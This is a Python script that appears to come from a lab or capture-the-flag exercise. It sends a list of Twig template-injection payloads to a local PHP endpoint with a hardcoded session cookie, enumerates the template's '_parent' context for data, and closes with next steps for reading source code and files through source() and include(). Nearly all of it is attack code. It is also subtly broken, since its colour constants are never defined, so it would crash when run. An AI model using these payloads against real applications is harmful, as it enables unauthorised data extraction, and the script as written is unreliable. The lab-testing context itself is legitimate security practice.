import requests
import json
import re
from urllib.parse import quote

base_url = "http://127.0.0.1:8080"
target_endpoint = "/index.php"
session_cookie = "adf118a2717e83ee6455ea878ebb507e"

session = requests.Session()
session.cookies.set("PHPSESSID", session_cookie)

print(f"[*] PINPOINT ANALYSIS: Extracting real data from _parent structure")
print(f"[*] Target: {base_url}{target_endpoint}")
print(f"[*] Testing systematic data extraction...\n")

# Focus on _parent - we've confirmed it exists
targeted_payloads = [
    # Direct _parent access
    "{{ _parent }}",
    "{{ _parent|keys }}",
    "{{ _parent|length }}",
    "{{ _parent|first }}",
    "{{ _parent|last }}",
    
    # Loop through _parent
    "{% for key in _parent|keys %}{{ key }},{% endfor %}",
    "{% for key, value in _parent %}{{ key }}:{{ value }},{% endfor %}",
    "{% for key in _parent|keys %}{{ key }}:{{ _parent[key] }},{% endfor %}",
    
    # Check _parent structure
    "{{ _parent.articles }}",
    "{{ _parent['articles'] }}",
    "{{ _parent.article }}",
    "{{ _parent['article'] }}",
    "{{ _parent.items }}",
    "{{ _parent['items'] }}",
    "{{ _parent.data }}",
    "{{ _parent['data'] }}",
    "{{ _parent.records }}",
    "{{ _parent['records'] }}",
    "{{ _parent.posts }}",
    "{{ _parent['posts'] }}",
    "{{ _parent.content }}",
    "{{ _parent['content'] }}",
    
    # Numeric access
    "{{ _parent[0] }}",
    "{{ _parent[1] }}",
    "{{ _parent[2] }}",
    
    # Try to get length of nested structures
    "{% for key in _parent|keys %}{{ key }}({{ _parent[key]|length }}),{% endfor %}",
    
    # Check if _parent contains article data
    "{{ _parent is defined }}",
    "{{ _parent is not null }}",
    "{{ _parent is iterable }}",
    "{{ _parent is not iterable }}",
]

# Test each payload
results = []
for i, payload in enumerate(targeted_payloads, 1):
    try:
        print(f"Test {i}: {payload}")
        
        data = {'name': payload}
        response = session.post(f"{base_url}{target_endpoint}", data=data, timeout=5)
        
        response_text = response.text
        status_code = response.status_code
        length = len(response_text)
        
        # Check if it shows something different than "is in stock"
        is_standard = "is in stock! Come back and test another one" in response_text
        has_data = length > 200 and not is_standard
        has_error = "Fatal error" in response_text or "Warning" in response_text or "Error" in response_text
        
        # Extract useful info from response
        patterns = {
            'standard': is_standard,
            'error': has_error,
            'data': has_data,
            'keys': 'key' in response_text.lower(),
            'array': 'array' in response_text.lower(),
            'null': 'null' in response_text.lower(),
            'length': 'length' in response_text.lower()
        }
        
        active_patterns = [k for k, v in patterns.items() if v]
        
        print(f"  Length: {length} | Status: {status_code} | Patterns: {active_patterns}")
        
        # Parse out actual content
        content_preview = ""
        if has_data:
            content_preview = response_text[:300].replace('\n', ' ')
            print(f"  {GREEN}[+] DATA FOUND!{RESET}")
            print(f"  Preview: {content_preview}")
        elif has_error and not is_standard:
            # Error might contain useful information
            error_preview = response_text[:300].replace('\n', ' ')
            print(f"  {YELLOW}[!] Error but interesting:{RESET}")
            print(f"  {error_preview}")
        elif not is_standard:
            print(f"  {YELLOW}[!] Non-standard response:{RESET}")
            print(f"  {response_text[:200]}")
        else:
            print(f"  [-] Standard template response")
        
        results.append({
            'payload': payload,
            'length': length,
            'status': status_code,
            'patterns': active_patterns,
            'response': response_text
        })
        
    except Exception as e:
        print(f"  {RED}[!] Error: {str(e)}{RESET}")

# Summary
print(f"\n{YELLOW}{'='*60}{RESET}")
print(f"{GREEN}[*] PINPOINT ANALYSIS COMPLETE{RESET}")
print(f"Tested {len(targeted_payloads)} payloads\n")

# Find most promising
best_results = [r for r in results if r['length'] > 250 or ('data' in r['patterns'])]
print(f"{GREEN}[*] MOST PROMISING RESULTS:{RESET}")
for idx, r in enumerate(best_results[:10], 1):
    print(f"\n{idx}. Payload: {r['payload']}")
    print(f"   Length: {r['length']}")
    print(f"   Patterns: {r['patterns']}")
    
    if r['length'] > 300:
        preview = r['response'][:250].replace('\n', ' ')
        print(f"   Preview: {preview}")

# Save all results
with open('/tmp/pinpoint_twig_results.json', 'w') as f:
    json.dump(results, f, indent=2, default=str)

print(f"\n[*] Full results saved to /tmp/pinpoint_twig_results.json")

# Recommendations
print(f"\n{YELLOW}[*] IMMEDIATE NEXT STEPS:{RESET}")
print("1. Use longest responses to extract actual data")
print("2. Try nested _parent access patterns")
print("3. Target specific data sources (database, files)")
print("4. Use source() and include() to read source code")

print(f"\n{GREEN}[*] Ready for focused exploitation!{RESET}")
